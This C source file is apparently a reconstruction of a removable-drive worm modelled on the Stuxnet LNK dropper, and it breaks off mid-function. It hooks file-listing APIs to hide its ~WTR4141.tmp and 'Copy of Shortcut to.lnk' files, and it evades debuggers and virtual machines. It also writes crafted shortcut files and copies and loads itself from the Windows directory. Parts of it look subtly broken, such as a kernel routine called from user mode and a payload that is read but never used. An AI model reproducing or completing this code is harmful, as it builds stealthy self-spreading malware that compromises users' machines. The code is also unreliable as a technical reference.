#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

#define NtCurrentProcess()              ((HANDLE)(LONG_PTR)-1)

typedef struct _WTR4141_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[WTR4141_MAX_PATH];
    WCHAR szSystemPath[WTR4141_MAX_PATH];
    WCHAR szWindowsPath[WTR4141_MAX_PATH];
    WCHAR szTempPath[WTR4141_MAX_PATH];
    WCHAR szDrivePath[WTR4141_MAX_PATH];
    BYTE bReserved[256];
} WTR4141_CTX, * PWTR4141_CTX;

typedef struct _WTR4141_HOOK_ENTRY {
    LPCSTR szDllName;
    LPCSTR szFuncName;
    PVOID pOriginal;
    PVOID pHook;
    BYTE bOriginalBytes[8];
} WTR4141_HOOK_ENTRY, * PWTR4141_HOOK_ENTRY;

typedef struct _WTR4141_IAT_ENTRY {
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    LPCSTR szDllName;
    LPCSTR szFuncName;
    PVOID pOriginal;
    PVOID pHook;
} WTR4141_IAT_ENTRY, * PWTR4141_IAT_ENTRY;

static WTR4141_CTX g_Wtr4141Ctx;
static BOOL g_bInitialized = FALSE;
static BOOL g_bHooksInstalled = FALSE;
static DWORD g_dwDriveType = 0;
static WCHAR g_szCurrentDrive[4] = L"A:\\";
static WTR4141_IAT_ENTRY g_IATHooks[32];
static DWORD g_dwIATHookCount = 0;

typedef NTSTATUS (NTAPI *PFN_NtQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef NTSTATUS (NTAPI *PFN_ZwQueryDirectoryFile)(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
);

typedef HANDLE (WINAPI *PFN_FindFirstFileW)(
    LPCWSTR lpFileName,
    LPWIN32_FIND_DATAW lpFindFileData
);

typedef BOOL (WINAPI *PFN_FindNextFileW)(
    HANDLE hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData
);

typedef HANDLE (WINAPI *PFN_FindFirstFileExW)(
    LPCWSTR lpFileName,
    FINDEX_INFO_LEVELS fInfoLevelId,
    LPVOID lpFindFileData,
    FINDEX_SEARCH_OPS fSearchOp,
    LPVOID lpSearchFilter,
    DWORD dwAdditionalFlags
);

static PFN_NtQueryDirectoryFile pOriginalNtQueryDirectoryFile = NULL;
static PFN_ZwQueryDirectoryFile pOriginalZwQueryDirectoryFile = NULL;
static PFN_FindFirstFileW pOriginalFindFirstFileW = NULL;
static PFN_FindNextFileW pOriginalFindNextFileW = NULL;
static PFN_FindFirstFileExW pOriginalFindFirstFileExW = NULL;

static BOOL WTR4141_IsFileHidden(LPCWSTR szFileName) {
    if (!szFileName) return FALSE;
    if (wcsstr(szFileName, L"~WTR4141.tmp") != NULL) return TRUE;
    if (wcsstr(szFileName, L"~WTR4132.tmp") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Copy of Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"Copy of Copy of Copy of Copy of Shortcut to.lnk") != NULL) return TRUE;
    if (wcsstr(szFileName, L"autorun.inf") != NULL) return TRUE;
    return FALSE;
}

static BOOL WTR4141_IsDriveRemovable(LPCWSTR szDrive) {
    UINT uType = GetDriveTypeW(szDrive);
    return (uType == DRIVE_REMOVABLE);
}

static NTSTATUS WTR4141_FilterDirectoryEntries(
    PVOID pFileInfo,
    ULONG Length,
    FILE_INFORMATION_CLASS InfoClass,
    PULONG pReturnLength
) {
    PFILE_DIRECTORY_INFORMATION pCurrent;
    PFILE_DIRECTORY_INFORMATION pPrev;
    PFILE_DIRECTORY_INFORMATION pNext;
    UNICODE_STRING ustrFileName;
    WCHAR szFileName[WTR4141_MAX_PATH];
    ULONG ulEntrySize;
    ULONG ulRemaining;
    ULONG ulNewLength;
    BOOL bFound;
    if (!pFileInfo || Length == 0 || !pReturnLength) {
        return STATUS_INVALID_PARAMETER;
    }
    if (InfoClass != FileDirectoryInformation && InfoClass != FileBothDirectoryInformation) {
        return STATUS_SUCCESS;
    }
    pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
    pPrev = NULL;
    ulRemaining = *pReturnLength;
    ulNewLength = 0;
    bFound = FALSE;
    while (ulRemaining >= sizeof(FILE_DIRECTORY_INFORMATION)) {
        ulEntrySize = pCurrent->NextEntryOffset ? pCurrent->NextEntryOffset : ulRemaining;
        if (pCurrent->FileNameLength > 0 && pCurrent->FileNameLength < WTR4141_MAX_PATH * sizeof(WCHAR)) {
            ZeroMemory(szFileName, sizeof(szFileName));
            memcpy(szFileName, pCurrent->FileName, pCurrent->FileNameLength);
            szFileName[pCurrent->FileNameLength / sizeof(WCHAR)] = L'\0';
            if (WTR4141_IsFileHidden(szFileName)) {
                bFound = TRUE;
                if (pCurrent->NextEntryOffset != 0) {
                    pNext = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + pCurrent->NextEntryOffset);
                    if (pPrev == NULL) {
                        RtlCopyMemory(pCurrent, pNext, ulRemaining - pCurrent->NextEntryOffset);
                        pCurrent = (PFILE_DIRECTORY_INFORMATION)pFileInfo;
                        ulRemaining -= pCurrent->NextEntryOffset;
                        continue;
                    } else {
                        pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
                        pCurrent = pNext;
                        ulRemaining -= ulEntrySize;
                        continue;
                    }
                } else {
                    if (pPrev != NULL) {
                        pPrev->NextEntryOffset = 0;
                    }
                    ulRemaining = 0;
                    break;
                }
            }
        }
        ulNewLength += ulEntrySize;
        pPrev = pCurrent;
        pCurrent = (PFILE_DIRECTORY_INFORMATION)((PBYTE)pCurrent + ulEntrySize);
        ulRemaining -= ulEntrySize;
    }
    if (bFound) {
        *pReturnLength = ulNewLength;
    }
    return STATUS_SUCCESS;
}

static NTSTATUS NTAPI WTR4141_Hook_NtQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;
    if (!pOriginalNtQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = pOriginalNtQueryDirectoryFile(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );
    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }
    WTR4141_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );
    return status;
}

static NTSTATUS NTAPI WTR4141_Hook_ZwQueryDirectoryFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID FileInformation,
    ULONG Length,
    FILE_INFORMATION_CLASS FileInformationClass,
    BOOLEAN ReturnSingleEntry,
    PUNICODE_STRING FileName,
    BOOLEAN RestartScan
) {
    NTSTATUS status;
    if (!pOriginalZwQueryDirectoryFile) {
        return STATUS_UNSUCCESSFUL;
    }
    status = pOriginalZwQueryDirectoryFile(
        FileHandle,
        Event,
        ApcRoutine,
        ApcContext,
        IoStatusBlock,
        FileInformation,
        Length,
        FileInformationClass,
        ReturnSingleEntry,
        FileName,
        RestartScan
    );
    if (!NT_SUCCESS(status) || !FileInformation || !IoStatusBlock) {
        return status;
    }
    WTR4141_FilterDirectoryEntries(
        FileInformation,
        Length,
        FileInformationClass,
        &IoStatusBlock->Information
    );
    return status;
}

static HANDLE WINAPI WTR4141_Hook_FindFirstFileW(
    LPCWSTR lpFileName,
    LPWIN32_FIND_DATAW lpFindFileData
) {
    HANDLE hResult;
    if (!pOriginalFindFirstFileW) {
        return INVALID_HANDLE_VALUE;
    }
    hResult = pOriginalFindFirstFileW(lpFileName, lpFindFileData);
    if (hResult != INVALID_HANDLE_VALUE && lpFindFileData) {
        if (WTR4141_IsFileHidden(lpFindFileData->cFileName)) {
            FindClose(hResult);
            SetLastError(ERROR_NO_MORE_FILES);
            return INVALID_HANDLE_VALUE;
        }
    }
    return hResult;
}

static BOOL WINAPI WTR4141_Hook_FindNextFileW(
    HANDLE hFindFile,
    LPWIN32_FIND_DATAW lpFindFileData
) {
    BOOL bResult;
    if (!pOriginalFindNextFileW) {
        return FALSE;
    }
    while (1) {
        bResult = pOriginalFindNextFileW(hFindFile, lpFindFileData);
        if (!bResult || !lpFindFileData) {
            return bResult;
        }
        if (!WTR4141_IsFileHidden(lpFindFileData->cFileName)) {
            return TRUE;
        }
    }
}

static HANDLE WINAPI WTR4141_Hook_FindFirstFileExW(
    LPCWSTR lpFileName,
    FINDEX_INFO_LEVELS fInfoLevelId,
    LPVOID lpFindFileData,
    FINDEX_SEARCH_OPS fSearchOp,
    LPVOID lpSearchFilter,
    DWORD dwAdditionalFlags
) {
    HANDLE hResult;
    if (!pOriginalFindFirstFileExW) {
        return INVALID_HANDLE_VALUE;
    }
    hResult = pOriginalFindFirstFileExW(
        lpFileName,
        fInfoLevelId,
        lpFindFileData,
        fSearchOp,
        lpSearchFilter,
        dwAdditionalFlags
    );
    if (hResult != INVALID_HANDLE_VALUE && lpFindFileData) {
        PWIN32_FIND_DATAW pFindData = (PWIN32_FIND_DATAW)lpFindFileData;
        if (WTR4141_IsFileHidden(pFindData->cFileName)) {
            FindClose(hResult);
            SetLastError(ERROR_NO_MORE_FILES);
            return INVALID_HANDLE_VALUE;
        }
    }
    return hResult;
}

static BOOL WTR4141_InstallIATHooks(VOID) {
    HMODULE hModule;
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_IMPORT_DESCRIPTOR pImportDesc;
    PIMAGE_THUNK_DATA pThunk;
    PIMAGE_THUNK_DATA pOrigThunk;
    LPCSTR szDllName;
    LPCSTR szFuncName;
    DWORD dwOldProtect;
    DWORD i, j;
    hModule = GetModuleHandleW(NULL);
    if (!hModule) return FALSE;
    pDos = (PIMAGE_DOS_HEADER)hModule;
    if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    if (pNt->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)hModule + pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);
    if (!pImportDesc) return FALSE;
    for (i = 0; pImportDesc[i].Name != 0; i++) {
        szDllName = (LPCSTR)((PBYTE)hModule + pImportDesc[i].Name);
        if (!szDllName) continue;
        if (_stricmp(szDllName, "kernel32.dll") == 0 || _stricmp(szDllName, "ntdll.dll") == 0) {
            pThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc[i].FirstThunk);
            pOrigThunk = (PIMAGE_THUNK_DATA)((PBYTE)hModule + pImportDesc[i].OriginalFirstThunk);
            if (!pThunk) continue;
            for (j = 0; pThunk[j].u1.AddressOfData != 0; j++) {
                if (!pOrigThunk) continue;
                if (IMAGE_SNAP_BY_ORDINAL(pOrigThunk[j].u1.Ordinal)) {
                    continue;
                }
                PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)hModule + pOrigThunk[j].u1.AddressOfData);
                if (!pImportByName) continue;
                szFuncName = (LPCSTR)pImportByName->Name;
                if (!szFuncName) continue;
                if (_stricmp(szFuncName, "FindFirstFileW") == 0) {
                    pOriginalFindFirstFileW = (PFN_FindFirstFileW)pThunk[j].u1.Function;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), PAGE_READWRITE, &dwOldProtect);
                    pThunk[j].u1.Function = (ULONG_PTR)WTR4141_Hook_FindFirstFileW;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), dwOldProtect, &dwOldProtect);
                    g_IATHooks[g_dwIATHookCount].szDllName = "kernel32.dll";
                    g_IATHooks[g_dwIATHookCount].szFuncName = "FindFirstFileW";
                    g_IATHooks[g_dwIATHookCount].pOriginal = pOriginalFindFirstFileW;
                    g_IATHooks[g_dwIATHookCount].pHook = WTR4141_Hook_FindFirstFileW;
                    g_dwIATHookCount++;
                } else if (_stricmp(szFuncName, "FindNextFileW") == 0) {
                    pOriginalFindNextFileW = (PFN_FindNextFileW)pThunk[j].u1.Function;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), PAGE_READWRITE, &dwOldProtect);
                    pThunk[j].u1.Function = (ULONG_PTR)WTR4141_Hook_FindNextFileW;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), dwOldProtect, &dwOldProtect);
                    g_IATHooks[g_dwIATHookCount].szDllName = "kernel32.dll";
                    g_IATHooks[g_dwIATHookCount].szFuncName = "FindNextFileW";
                    g_IATHooks[g_dwIATHookCount].pOriginal = pOriginalFindNextFileW;
                    g_IATHooks[g_dwIATHookCount].pHook = WTR4141_Hook_FindNextFileW;
                    g_dwIATHookCount++;
                } else if (_stricmp(szFuncName, "FindFirstFileExW") == 0) {
                    pOriginalFindFirstFileExW = (PFN_FindFirstFileExW)pThunk[j].u1.Function;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), PAGE_READWRITE, &dwOldProtect);
                    pThunk[j].u1.Function = (ULONG_PTR)WTR4141_Hook_FindFirstFileExW;
                    VirtualProtect(&pThunk[j].u1.Function, sizeof(PVOID), dwOldProtect, &dwOldProtect);
                    g_IATHooks[g_dwIATHookCount].szDllName = "kernel32.dll";
                    g_IATHooks[g_dwIATHookCount].szFuncName = "FindFirstFileExW";
                    g_IATHooks[g_dwIATHookCount].pOriginal = pOriginalFindFirstFileExW;
                    g_IATHooks[g_dwIATHookCount].pHook = WTR4141_Hook_FindFirstFileExW;
                    g_dwIATHookCount++;
                }
            }
        }
    }
    return TRUE;
}

static BOOL WTR4141_InstallSSDTHooks(VOID) {
    HMODULE hNtdll;
    PVOID pFunc;
    UNICODE_STRING ustrName;
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    RtlInitUnicodeString(&ustrName, L"NtQueryDirectoryFile");
    pFunc = MmGetSystemRoutineAddress(&ustrName);
    if (pFunc) {
        pOriginalNtQueryDirectoryFile = (PFN_NtQueryDirectoryFile)pFunc;
    }
    RtlInitUnicodeString(&ustrName, L"ZwQueryDirectoryFile");
    pFunc = MmGetSystemRoutineAddress(&ustrName);
    if (pFunc) {
        pOriginalZwQueryDirectoryFile = (PFN_ZwQueryDirectoryFile)pFunc;
    }
    if (!pOriginalNtQueryDirectoryFile || !pOriginalZwQueryDirectoryFile) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4141_LoadPayload(VOID) {
    HANDLE hFile;
    HANDLE hSelf;
    DWORD dwSize;
    DWORD dwRead;
    PBYTE pData;
    HMODULE hPayload;
    FARPROC pExport;
    WCHAR szPath[WTR4141_MAX_PATH];
    WCHAR szSelfPath[WTR4141_MAX_PATH];
    WCHAR szAslrPath[WTR4141_MAX_PATH];
    DWORD dwRandom;
    GetModuleFileNameW(NULL, szSelfPath, WTR4141_MAX_PATH);
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_PAYLOAD_NAME);
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0 || dwSize > WTR4141_BUFFER_SIZE * 16) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    hSelf = GetModuleHandleW(NULL);
    if (!hSelf) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    GetModuleFileNameW(hSelf, szSelfPath, WTR4141_MAX_PATH);
    wcscpy_s(szAslrPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szWindowsPath);
    wcscat_s(szAslrPath, WTR4141_MAX_PATH, L"\\");
    wcscat_s(szAslrPath, WTR4141_MAX_PATH, WTR4141_KERNEL32_ASLR);
    dwRandom = GetTickCount() ^ GetCurrentProcessId() ^ (DWORD)(ULONG_PTR)pData;
    wsprintfW(szAslrPath + wcslen(szAslrPath), L"%08x", dwRandom);
    wcscat_s(szAslrPath, WTR4141_MAX_PATH, L".dll");
    if (!CopyFileW(szSelfPath, szAslrPath, FALSE)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    hPayload = LoadLibraryW(szAslrPath);
    if (!hPayload) {
        DeleteFileW(szAslrPath);
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    pExport = GetProcAddress(hPayload, "Export1");
    if (pExport) {
        ((void (*)(void))pExport)();
    }
    DeleteFileW(szAslrPath);
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL WTR4141_HideFiles(VOID) {
    WCHAR szPath[WTR4141_MAX_PATH];
    DWORD dwAttr;
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_DLL_NAME);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_PAYLOAD_NAME);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK1);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK2);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK3);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    wcscpy_s(szPath, WTR4141_MAX_PATH, g_Wtr4141Ctx.szDrivePath);
    wcscat_s(szPath, WTR4141_MAX_PATH, WTR4141_LNK4);
    dwAttr = GetFileAttributesW(szPath);
    if (dwAttr != INVALID_FILE_ATTRIBUTES) {
        SetFileAttributesW(szPath, FILE_ATTRIBUTE_HIDDEN);
    }
    return TRUE;
}

static BOOL WTR4141_Init(VOID) {
    DWORD dwMajor, dwMinor, dwBuild;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Wtr4141Ctx, sizeof(WTR4141_CTX));
    g_Wtr4141Ctx.dwMagic = WTR4141_MAGIC;
    g_Wtr4141Ctx.dwVersion = WTR4141_VERSION;
    g_Wtr4141Ctx.dwPid = GetCurrentProcessId();
    g_Wtr4141Ctx.dwTid = GetCurrentThreadId();
    g_Wtr4141Ctx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Wtr4141Ctx.csLock);
    GetModuleFileNameW(NULL, g_Wtr4141Ctx.szModulePath, WTR4141_MAX_PATH);
    GetSystemDirectoryW(g_Wtr4141Ctx.szSystemPath, WTR4141_MAX_PATH);
    GetWindowsDirectoryW(g_Wtr4141Ctx.szWindowsPath, WTR4141_MAX_PATH);
    GetTempPathW(WTR4141_MAX_PATH, g_Wtr4141Ctx.szTempPath);
    wcscpy_s(g_Wtr4141Ctx.szDrivePath, WTR4141_MAX_PATH, L"C:\\");
    g_bInitialized = TRUE;
    return TRUE;
}

static BOOL WTR4141_Cleanup(VOID) {
    if (g_Wtr4141Ctx.hMutex) {
        CloseHandle(g_Wtr4141Ctx.hMutex);
        g_Wtr4141Ctx.hMutex = NULL;
    }
    if (g_Wtr4141Ctx.hStopEvent) {
        CloseHandle(g_Wtr4141Ctx.hStopEvent);
        g_Wtr4141Ctx.hStopEvent = NULL;
    }
    if (g_Wtr4141Ctx.hThread) {
        CloseHandle(g_Wtr4141Ctx.hThread);
        g_Wtr4141Ctx.hThread = NULL;
    }
    DeleteCriticalSection(&g_Wtr4141Ctx.csLock);
    g_bInitialized = FALSE;
    return TRUE;
}

static DWORD WINAPI WTR4141_WorkerThread(LPVOID lpParam) {
    DWORD dwDrives;
    WCHAR szDrive[4];
    DWORD i;
    while (WaitForSingleObject(g_Wtr4141Ctx.hStopEvent, 5000) != WAIT_OBJECT_0) {
        dwDrives = GetLogicalDrives();
        for (i = 0; i < 26; i++) {
            if (dwDrives & (1 << i)) {
                szDrive[0] = L'A' + i;
                szDrive[1] = L':';
                szDrive[2] = L'\\';
                szDrive[3] = L'\0';
                if (WTR4141_IsDriveRemovable(szDrive)) {
                    wcscpy_s(g_Wtr4141Ctx.szDrivePath, WTR4141_MAX_PATH, szDrive);
                    WTR4141_HideFiles();
                }
            }
        }
        Sleep(1000);
    }
    return 0;
}

static BOOL WTR4141_StartWorker(VOID) {
    g_Wtr4141Ctx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_Wtr4141Ctx.hStopEvent) return FALSE;
    g_Wtr4141Ctx.hThread = CreateThread(NULL, 0, WTR4141_WorkerThread, NULL, 0, NULL);
    if (!g_Wtr4141Ctx.hThread) {
        CloseHandle(g_Wtr4141Ctx.hStopEvent);
        g_Wtr4141Ctx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4141_CheckMutex(VOID) {
    HANDLE hMutex;
    hMutex = CreateMutexW(NULL, FALSE, WTR4141_MUTEX);
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Wtr4141Ctx.hMutex = hMutex;
    return TRUE;
}

static BOOL WTR4141_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL WTR4141_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static BOOL WTR4141_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL WTR4141_CheckRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, WTR4141_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, WTR4141_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WTR4141_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, WTR4141_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, WTR4141_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL WTR4141_CreateLNKFiles(VOID) {
    HANDLE hFile;
    DWORD dwWritten;
    WCHAR szPath[WTR4141_MAX_PATH];
    WCHAR szTarget[WTR4141_MAX_PATH];
    BYTE lnkData[4096];
    ZeroMemory(lnkData, sizeof(lnkData));
    *(DWORD*)(lnkData + 0) = 0x0000004C;
    *(DWORD*)(lnkData + 4) = 0x00021401;
    *(DWORD*)(lnkData + 16) = 0x00000007;
    *(DWORD*)(lnkData + 20) = 0x00020000;
    *(DWORD*)(lnkData + 24) = 0x00000001;
    *(DWORD*)(lnkData + 28) = 0x00000001;
    *(DWORD*)(lnkData + 32) = 0x00000001;
    GetSystemTimeAsFileTime((LPFILETIME)(lnkData + 36));
    *(DWORD*)(lnkData + 52) = 0x00020000;
    *(DWORD*)(lnkData + 56) = 0x00000005;
    *(DWORD*)(lnkData + 60) = 0x00000001;
    wcscpy_s((WCHAR*)(lnkData + 64), 260, L"~WTR4141.tmp");
    wcscpy_s((WCHAR*)(lnkData + 584), 260, L"~WTR4141.tmp");
    wcscpy_s((WCHAR*)(lnkData + 1104), 260, L"~WTR4141.tmp");
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK1);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK2);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK3);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_LNK4);
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        WriteFile(hFile, lnkData, sizeof(lnkData), &dwWritten, NULL);
        CloseHandle(hFile);
    }
    return TRUE;
}

static BOOL WTR4141_CopyFilesToDrive(VOID) {
    HANDLE hFile;
    HANDLE hSelf;
    DWORD dwSize;
    DWORD dwRead;
    DWORD dwWritten;
    PBYTE pData;
    WCHAR szPath[WTR4141_MAX_PATH];
    WCHAR szSelfPath[WTR4141_MAX_PATH];
    GetModuleFileNameW(NULL, szSelfPath, WTR4141_MAX_PATH);
    wsprintfW(szPath, L"%s%s", g_Wtr4141Ctx.szDrivePath, WTR4141_DLL_NAME);
